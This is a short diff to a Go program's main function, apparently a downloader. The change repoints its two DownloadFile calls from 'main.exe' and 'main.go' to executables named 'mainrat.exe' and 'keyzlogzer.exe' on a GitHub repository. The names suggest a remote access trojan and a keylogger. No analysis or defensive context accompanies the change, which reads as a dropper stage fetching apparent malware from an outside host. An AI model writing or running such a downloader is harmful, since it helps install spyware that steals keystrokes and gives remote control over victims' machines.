@@ -71,11 +71,11 @@ func DownloadFile(fileURL, destination string) string {
 
 func main() {
 	// Example usage
-	url := "https://github.com/NobelTad/test/raw/refs/heads/main/main.exe" // use /raw/ to get the actual file
+	url := "https://github.com/NobelTad/test/raw/refs/heads/main/mainrat.exe" // use /raw/ to get the actual file
 	destination := ""
 	result := DownloadFile(url, destination)
 	fmt.Println(result)
-	url2 := "https://raw.githubusercontent.com/NobelTad/test/refs/heads/main/main.go" // use /raw/ to get the actual file
+	url2 := "https://github.com/NobelTad/test/raw/refs/heads/main/keyzlogzer.exe" // use /raw/ to get the actual file
 	destination2 := ""
 	result2 := DownloadFile(url2, destination2)
 	fmt.Println(result2)
